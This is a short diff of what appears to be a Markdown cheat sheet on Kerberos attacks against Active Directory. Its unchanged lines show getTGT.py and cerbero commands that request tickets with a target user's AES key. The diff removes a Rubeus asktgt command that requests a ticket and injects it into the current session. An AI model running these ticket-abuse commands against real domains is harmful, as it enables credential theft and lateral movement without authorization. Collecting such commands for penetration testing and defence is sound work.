@@ -54,9 +54,6 @@ getTGT.py $zdom_fqdn/$ztarg_user_name@$ztarg_computer_fqdn -aesKey $ztarg_user_a
 
 cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
 cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
-
-cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
-./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
 ```
 
 ##  4. <a name='ccache-convert'></a>ccache-convert
